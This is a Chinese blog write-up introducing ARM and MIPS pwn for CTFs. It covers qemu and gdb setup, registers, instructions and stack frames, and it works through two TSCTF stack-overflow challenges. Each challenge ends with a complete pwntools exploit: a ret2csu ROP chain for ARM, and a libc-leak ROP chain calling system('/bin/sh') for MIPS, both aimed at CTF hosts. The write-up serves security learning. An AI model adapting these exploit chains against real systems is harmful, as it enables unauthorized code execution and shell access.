# 初窥ARM&MIPS


雨下整夜，我的爱溢出就像雨水。					——《七里香》周杰伦

<!--more-->

之前做的pwn题都是基于x86架构的ELF文件题目，这一次参加TSCTF，有一大半的题目是非x86架构的题目，不得不现学相关知识，用这篇博客来总结一下在题目中学到的东西。

ps：题目的相关二进制文件和EXP放在了[github](https://github.com/Nopnping/Nopnoping.github.io/tree/master/resource)上。

# ARM

## 环境搭建

我们利用qemu来启动arm程序。qemu是一种虚拟化模拟器，在user mode其能模拟不同架构的CPU，并运行为这些不同架构CPU编译的Linux文件，比如我们这里将要启动的ARM文件。

**安装qemu**

````bash
sudo apt-get install qemu-user
````

安装qemu后，我们就可以启动静态链接的ARM程序了，如果是动态链接的ARM程序，那么我们还需要指出其动态链接库储存的位置，如果题目没有给出文件的动态链接库，需要自己下载。

**下载动态链接库**

```` bash
#首先搜索一下有哪些动态链接库
apt search "libc6-" | grep "arm"
#然后在搜索结果中选择一个形似libc6-arm-cross的库安装即可
sudo apt-get install libc6-arm64-cross
````

接下来我们就可以启动动态链接的arm程序了

**启动程序**

````bash
#静态链接
qemu-arm ./arm-file
#动态链接，题目没有给出链接文件，自行下载
qemu-arm -L /usr/aarch64-linux-gnu/lib ./arm-file
#动态链接，题目给出链接文件
qemu-arm -L ./lib ./arm-file
````

ok，现在程序已经可以启动起来了，最后还需要做的就是用gdb来调试程序，这里需要用到的是gdb-multiarch，该gdb可以attach到不同架构的文件上。

**安装gdb-multiarch**

````bash
sudo apt-get install git gdb gdb-multiarch
````

之后我们在qemu-arm中开启一个端口，然后用gdb-multiarch去链接即可调试arm程序

**利用gdb-multiarch调试arm程序**

````bash
#qemu开启端口
qemu-arm -g 123 -L /usr/aarch64-linux-gnu/lib ./arm-file
#gdb-multiarch启动后
>>target remote localhost:123
#这里也可以写一个gdb脚本，用-comand来运行
gdb-multiarch -command=gdb.sh
````

## 寄存器，指令知识

### 寄存器

ARM处理器一共有7种工作模式

+ **USR模式**：正常用户模式，程序正常执行
+ **FIQ模式（Fast Interrupt Request）**：处理快速中断，支持高速数据传送或通道处理
+ **IRQ模式**：处理普通中断
+ **SVC模式（Supervisor）**：操作系统保护模式，处理软件中断swi reset
+ **ABT中止（Abort mode）**：处理存储器故障，实现虚拟储存器和存储器保护
+ **UND未定义（Undefined）**：处理未定义的指令陷阱，支持硬件协处理器的软件仿真
+ **SYS系统模式**：运行特权操作系统任务，基本等于USR

每种工作模式下用到的寄存器都会有所不同，其总共拥有31个通用寄存器

+ R0~R15
+ R13_irq，R14_irq
+ R13_svc，R14_svc
+ R13_abt，R14_abt
+ R13_und，R14_und
+ R8_fiq~R14_fiq

和6个状态寄存器

+ CPSR
+ SPSR_fiq
+ SPSR_irq
+ SPSR_svc
+ SPSR_abt
+ SPSR_und

每个状态下用到的通用寄存器和状态寄存器汇总如下：

| system&user | FIRQ      | Supervisor | Abort    | IRQ      | Undefined |
| ----------- | --------- | ---------- | -------- | -------- | --------- |
| R0          | R0        | R0         | R0       | R0       | R0        |
| R1          | R1        | R1         | R1       | R1       | R1        |
| R2          | R2        | R2         | R2       | R2       | R2        |
| R3          | R3        | R3         | R3       | R3       | R3        |
| R4          | R4        | R4         | R4       | R4       | R4        |
| R5          | R5        | R5         | R5       | R5       | R5        |
| R6          | R6        | R6         | R6       | R6       | R6        |
| R7          | R7        | R7         | R7       | R7       | R7        |
| R8          | R8_firq   | R8         | R8       | R8       | R8        |
| R9          | R9_firq   | R9         | R9       | R9       | R9        |
| R10         | R10_firq  | R10        | R10      | R10      | R10       |
| R11         | R11_firq  | R11        | R11      | R11      | R11       |
| R12         | R12_firq  | R12        | R12      | R12      | R12       |
| R13         | R13_firq  | R13_svc    | R13_abt  | R13_irq  | R13_und   |
| R14         | R14_firq  | R14_svc    | R14_abt  | R14_irq  | R14_und   |
| R15         | R15       | R15        | R15      | R15      | R15       |
| CPSR        | CPSR      | CPSR       | CPSR     | CPSR     | CPSR      |
|             | SPSR_firq | SPSR_svc   | SPSR_abt | SPSR_irq | SPSR_und  |

现在我们已经知道了各个工作模式下，都会用到哪些寄存器，接下来需要解决的问题是这些寄存器都有什么作用？和x86寄存器有哪些相似的地方？这里需要先介绍一个标准叫APCS，全称ARM Procedure Call standard（ARM过程调用标准），其定义了各个寄存器在程序中的作用并给各个寄存器起了别名。

+ R0-R3用于向子程序传递参数，APCS的别名为a1-a4，其类似于x86的rdi，rsi，rdx，rcx。R0寄存器也用于函数返回值的传递，类似于rax。
+ R4-R9用于储存局部变量，APCS的别名为v1-v6
+ R10是栈限制，APCS的别名为sl
+ R11是帧限制，APCS的别名为fp
+ R12是内部过程调用寄存器，APCS的别名为ip
+ R13是栈指针，APCS的别名为sp
+ R14是连接寄存器，APCS的别名为lr
+ R15是程序计数器，APCS的别名为pc

其中我们需要重点关注的是R0-R3，R13，R14，R15。R13和R15根据其别名能想到其功能，而R14的作用是保存返回地址，其对于理解ARM下的栈溢出有着关键作用。

### 指令

这里只简单介绍一下ARM的指令结构和常用指令，更详细的信息请看参考中ARM指令集详解。

ARM的指令结构为：\<opcode>{\<cond>}{S} \<Rd>,\<Rn>{,\<operand2>}

<>内的信息是必须的，{}内的项是可选的，如<opcode\>是指令助记符，是必须有的，而{<cond\>}为指令执行条件，是可选的，一般不写默认是AL即无条件执行。

+ opcode：指令助记符
+ cond：执行条件
+ S：是否影响CPSR寄存器的值，有S时影响，没有时不影响
+ Rd：目标寄存器
+ Rn：第一个操作数的寄存器
+ operand2：第二个操作数

OK，知道了ARM指令的结构后，我们来介绍几个ARM特有并且常见的指令

1. LDR

   LDR指令用于从内存中读取数据放入寄存器中。

   如：LDR R0,[R1] 即将R1寄存器储存的地址处的数据读入R0中

   ​		LDR R0,[R1,#0x100] 即将R1+0x100地址处的数据读入R0中，不修改R1的值

   ​		LDR R0,[R1],#0x100 即将R1+0x100地址处的数据读入R0中，并且修改R1为R1+100(*这里出现了第二个操作数，加了一个#号即为立即数，并且结果会写回R1中，注意和上一条指令的区别*)

   与LDR相对于的还有一个LDP指令，其是从内存中读取连续的数据赋值给寄存器

   如：LDP R0,R1,[SP,#0x100] 即将SP+0x100地址处的值，连续读入到R0和R1中，连续读入的意思是假设R0读取的是0xfff0地址处的值，R1读取0xfff8地址处的值(假设是64位)。

2. STR

   STR指令用于将数据储存在内存中。

   如：STR R0,[R1] 即将数据R0储存在R1寄存器储存的地址处。

   与STR相似的还有个指令是STP，其功能类似与LDP，其将多个寄存器的值，连续储存在内存中。

   如：STP R0,R1,[SP,#0x100] 即将数据R0和R1连续储存在SP+0x100地址处，连续意思与上面类似。

3. BL

   BL是带链接的跳转指令，其会将下一条指令拷贝到R14中，然后跳转到指定地址处。

   与之类似的还有B和BX，B是直接跳转，BX是带状态切换的跳转指令，跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码。

### 栈

ARM的栈结构和X86类似，R0-R3用于储存前四个参数，多余的参数会储存在栈中，在用户模式下会根据R14寄存器储存的值来返回，因此在函数开头和结尾常见的指令是：

STP             X29, X30, [SP,#-0x110]!

LDP             X29, X30, [SP],#0x110

## 例题

这里就以TSCTF的helloARM作为例题来讲解。

IDA打开后很容易发现，有一个oooooo函数存在栈溢出漏洞，这里我们从其汇编代码来观察函数，顺便学习巩固一下ARM的指令。

![image-20201102150936646](https://i.loli.net/2020/11/02/5UNWFE89Awxadvk.png)

**第一条语句:STP X29，X30，[SP，#-0x110]！**

X29相当于rbp，X30相当于返回地址，这句话的意思就是将rbp和返回地址，保存在sp-0x110处，叹号的意思是先修改寄存器再访问内存，相当于先计算sp=sp-0x110，再访问[sp]，所以执行这条语句后，SP寄存器也被修改了。不得不说ARM指令比起x86来说，简单了很多。

**第二条语句:MOV X29,SP**

将SP的值赋给X29，从后面观察发现，访问局部变量就都是通过X29来访问的了。

**第三-七条语句**

设置memset函数的三个参数，并用BL来跳转到memset函数处，根据前面的知识可得，BL会将下一条语句的地址赋值给R14，即这里的X30。

**read函数处**

根据X0的值我们知道其读取的地址是在rsp+0x10处，并且可以读入0x500的值，而分配给这个函数的零时变量只有0x100大小，所以存在溢出。(从第一句我们可以知道该函数的栈空间大小总共是0x110，但是最低的0x10直接数据留给了rbp和返回地址，所以变量就只有0x100)。

**倒数第二句:LDP X29，X30，[SP]，#0x110**

将第一句保存的rbp和返回地址的值赋值给X29和X30，相当于恢复环境

**最后一句:RET**

根据X30的值，来修改rip，相当于B X30，所以如果能修改X30的值就可以控制程序流。

根据上面的分析，我们发现我们可以溢出0x400的数据，但是X29是保存在低地址处的，也就是说没有办法修改oooooo函数保存的X29的值，那么我们就去修改main函数在栈地址上保存的值，观察main函数会发现，其X29也是保存在栈的低地址处的，所以只需要溢出0x108字节就可以控制main函数的X29了。

OK，现在我们可以控制控制流了，只要再能控制R0-R2三个寄存器的话，就可以get shell了。

观察了下IDA，发现程序没有能直接控制R0-R2的gadget，不像x86有push和pop，不过我们可以像x86利用ret2libc_csu一样来利用arm的ret2libc_csu，这里就不详细介绍ret2libc_csu了，基本原理和x86一致，直接看EXP。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote('10.104.255.210',7777)
else:
	sh=process(['qemu-aarch64','-g','1234','-L','/usr/aarch64-linux-gnu/','./HelloARm'])
	#sh=process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','./HelloARm'])

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	os.system('xfce4-terminal -x sh -c "gdb-multiarch pwn -ex \'target remote 127.0.0.1:1234\'"')

def paper_rop(func,r0=0,r1=0,r2=0,buff=0):
	rop = p64(0x000000000411080) #x30
	rop += p64(0x0000000000400AAC) 
	rop += p64(0)
	rop += p64(1) #20
	rop += p64(func) #x21=func
	rop += p64(r0) #x22=r0
	rop += p64(r1) #x23=r1
	rop += p64(r2) #x24=x2
	return rop

def exp():
	libc=ELF("./lib/libc-2.27.so")
	read=0x0000000000400760
	write=0x0000000000400730
	ru("number:")
	buff=int(ru("\n").replace("\n",''),16)-0x10
	info_addr("buff",buff)
	ru("name")
	sl("a")
	ru("message")
	payload="a"*0x108+p64(0x000000000400AD4)+p64(read)+p64(write)+\
			"a"*0x100+paper_rop(func=buff,r0=3,r1=0x000000000411090,r2=0x100)+\
			p64(0)+p64(0x000000000400AD4)+p64(0)*6+paper_rop(func=buff+8,r0=1,r1=0x000000000411090,r2=0x100)
	print hex(len(payload))
	sl(payload)
	itr()

exp()
````

# MIPS

## 简介

MIPS是Microcomputer without interlocked pipeline stages的缩写，含义是无互锁流水级微处理器，其另一个含义是每秒百万条指令——Millions of instructions per second。其采用精简指令系统计算机构（RISC结构）设计，相比于x86/64的CISC结构，更为简单，设计周期更短。最关键的一点，MIPS架构的授权费用比较低。

## 环境搭建

MIPS的环境搭建基本和ARM差不多，唯一的区别是在动态链接库搜索和qemu启动程序上面。

````bash
#动态链接库搜索
apt search "libc6-" | grep "mips"
#qemu启动
qemu-mipsel -g 123 -L ./lib ./mips-file
#注意qemu分小端和大端，mipsel是启动小端的程序
````

## 寄存器，指令和栈结构知识

### 寄存器

MIPS一共有32个寄存器，每个寄存器的功能和别名用下面的表格来展现。

| 编号          | 助记符号     | 含义                                                         |
| ------------- | ------------ | ------------------------------------------------------------ |
| 0             | zero         | 永远为0                                                      |
| 1             | at           | 用于汇编器的暂时变量                                         |
| 2-3           | v0,v1        | 子函数调用返回结果                                           |
| 4-7           | a0-a3        | 子函数调用的参数                                             |
| 8-15（24-25） | t0-t7(t8-t9) | 暂时变量，子函数使用时不需要保存与恢复                       |
|               | s0-s7        | 子函数寄存器变量。在返回之前子函数必须保存和恢复使用过的变量，从而调用函数知道这些寄存器的值没有变化 |
| 26，27        | k0,k1        | 通常被中断或异常处理处理程序使用作为保存一些系统参数         |
| 28            | gp           | 全局指针，一些运行系统维护这个指针来更方便的存取static和extern变量。 |
| 29            | sp           | 堆栈指针                                                     |
| 30            | s8/fp        | 第9个寄存器变量/子函数可作为帧指针用                         |
| 31            | ra           | 子函数返回地址                                               |

根据表格已经可以了解到大多数寄存器的作用，这里只取其中几个比较特别的寄存器来讲解一下。

**$0(zero)**:该寄存器的值永远为0，不管你向其存放什么值，都会返回0。

**$31(ra)**:存放函数的返回地址，一般在程序结尾，都会有一句jr $ra来实现程序返回，这与X86和ARM的返回方式有区别。

**$28(gp)**:该寄存器会存放一个全局指针，它会指向运行时决定的静态数据区域，这样当需要对这些数据进行存取时，只需要一条指令就可以。

有一点需要注意的是，MIPS相比x86和ARM，是没有状态寄存器的。

### 指令

MIPS的指令分成三种格式，R，I，J。

**R格式**

R格式(Register format)指令为纯寄存器指令，所有的操作数均保存在寄存器中（移位指令除外），其各个字段的含义如下：

| opcode | rs              | rt              | rd               | shamt  | funct        |
| ------ | --------------- | --------------- | ---------------- | ------ | ------------ |
| 31-26  | 25-21           | 20-16           | 15-11            | 10-6   | 5-0          |
| 操作符 | 源操作数寄存器1 | 源操作数寄存器2 | 目的操作数寄存器 | 位移量 | 操作符附加段 |

对于R格式的指令，其opcode都为零，由funct字段来区别不同的指令。

例如add和sub指令：

| 指令 | opcode | rs   | rt   | rd   | shamt | funct  |
| ---- | ------ | ---- | ---- | ---- | ----- | ------ |
| add  | 00000  | rs   | rt   | rd   | 00000 | 100000 |
| sub  | 000000 | rs   | rt   | rd   | 00000 | 100010 |

*算数指令*：add,addu,sub,subu,slt,sltu。其中u的意思是进行unsigned运算，slt指令的功能是rd=(rs<rt)?1:0，用来判断rs和rt寄存器值的大小。

*逻辑指令*：and,xor,or,nor

*位移指令*：sll,srl,sra,sllv,srlv,srav。有v的是由rs决定位移位数，没有的是由shamt决定。而有a的是保留符号位。

*跳转指令*：jr。该指令一般用在函数返回。

**I格式**

I格式(Immediate format)指令为带立即数的指令，最多能使用两个寄存器，其指令结构为：

| opcode | rs             | rd               | im     |
| ------ | -------------- | ---------------- | ------ |
| 31-26  | 25-21          | 20-16            | 15-0   |
| 操作符 | 源操作数寄存器 | 目的操作数寄存器 | 立即数 |

不同的指令有opcode来区分。

*算术指令*：addi,addiu,slti,sltiu。与R格式的指令基本一致，不过多了个i，其代表立即数。

*逻辑指令*：andi,ori,xori。

*载入指令*：li,lui,lw,sw。l代表load，从内存中加载数据到寄存器。s代表store，将寄存器的数值储存到内存中。

*跳转指令*：beq,bne。eq代表当两个寄存器的值相等时，才跳转。ne代表两个寄存器的值不相等时才跳转。

**J格式**

J格式(Jump format)为长跳转指令，仅有一个操作数，其指令结构为：

| opcode | address |
| ------ | ------- |
| 31-26  | 25-0    |
| 操作符 | 地址    |

注意这里的地址是伪直接地址，其最后的跳转地址是由pc的高四位和该地址右移两位得到，即PC=PC[29:31]+address<<2。

其指令有：j，jal。jal会将下一条指令的地址赋值给$31即$ra，通常用于子程序的调用中。

### 栈结构

MIPS的栈结构和x86是一样的，这里需要关注的是其如何保存返回地址和如何返回。

在函数开头通常会有**sw  $ra,0x1c($sp)**;这样的语句，它的作用就是保存返回地址到栈上。

函数结尾会有**lw $ra, 0x1c($sp);jr $ra;**这样的语句，它会将返回地址读入到ra中，并跳转。

## 例题

这里以TSCTF HelloMIPS题目作为例题的讲解。

题目的漏洞出现在oooooo函数处，有一个栈溢出漏洞，我们通过阅读汇编代码，来巩固上面学到的指令。

![image-20201103200545436](https://i.loli.net/2020/11/03/2kjBNs83RLPC1ay.png)

**第一，二条语句：**

li指令给$gp赋值，addu再使其指向所需要的全局变量处。

**第三-六条语句：**

给程序分配栈空间，栈空间大小为0x120，把返回地址，和调用函数的帧指针储存再栈地址高字节处，并将栈顶指针赋值给$fp。

**memset处：**

将栈空间0x18-0x118内的值赋为0，这里出现了$zero这个常为零的寄存器。

这里还有个细节需要注意，在每个跳转指令后面都跟着一个nop指令，这是因为MIPS在执行跳转指令时，会先执行下一条指令。

**read处：**

向栈空间0x18处读入0x500的地址，而栈空间总共才分配0x120大小的值，所以存在栈溢出。

**剩余部分**

恢复现场，将返回地址，保存的帧指针等都重新赋值给寄存器，而返回地址是保存在0x11c处的，而栈溢出可以修改此处的值，所以可以控制程序流。

题目还泄漏了libc的地址，因此我们可以到libc中找控制$a0-$a3的gadget，再调用system来获得shell。这些就不再讲解了，都是老ROP了，直接看EXP。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote('10.104.255.211',7777)
else:
	#sh=process(['qemu-mipsel','-g','123','-L','/mnt/hgfs/share/ctf/helloMIPS','./HelloMIPS'])
	sh=process(['qemu-mipsel','-L','/mnt/hgfs/share/ctf/helloMIPS','./HelloMIPS'])

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def exp():
	name=0x00440E20
	libc=ELF("./lib/libc.so.0")
	ru("Hello")
	sl("/bin/sh")
	ru(":")
	system=int(ru("\n").replace("\n",''),16)
	libc_base=system-libc.symbols["system"]
	secret=libc_base+0x00000000000F684
	ucmain=0x0000000000400BC8
	info_addr("system",system)
	offset=0x104
	payload="a"*offset+p32(ucmain)+\
			"a"*0x18+p32(name)+p32(0)+p32(secret)+p32(0)+"a"*0x24+p32(0x00000000004008AC)
	sl(payload)
	itr()

exp()
````

# 参考

[Arm PWN学习笔记](https://www.freebuf.com/articles/network/245930.html)

[ARM架构下的 Pwn 的一般解决思路](https://www.anquanke.com/post/id/199112)

[Qemu简述](https://www.cnblogs.com/bakari/p/7858029.html)

[GDB调试及其调试脚本的使用](https://blog.csdn.net/longerzone/article/details/8867790)

[arm架构寄存器介绍](https://blog.csdn.net/xiaoxiaopengbo/article/details/78693811)

[ARM过程调用标准---APCS简单介绍](https://www.cnblogs.com/mengfanrong/p/3881521.html)

[ARM指令集详解](https://blog.csdn.net/u014069939/article/details/81107340)

[MIPS 通用寄存器 + 指令](https://blog.csdn.net/gujing001/article/details/8476685)

[MIPS 寄存器使用约定](https://hev.cc/805.html)

[MIPS 指令集(共31条)](https://blog.csdn.net/yixilee/article/details/4316617)

[MIPS指令集与简要分析](https://www.jianshu.com/p/ac2c9e7b1d8f)

[MIPS指令集及汇编](chrome-extension://cdonnmffkdaoajfknoeeecmchibpmkmg/assets/pdf/web/viewer.html?file=http%3A%2F%2Fedu.i-soft.com.cn%2Fdoc%2Flongxin-2017%2F02-1MIPS%25E6%258C%2587%25E4%25BB%25A4%25E4%25B8%258E%25E6%25B1%2587%25E7%25BC%2596.pdf)






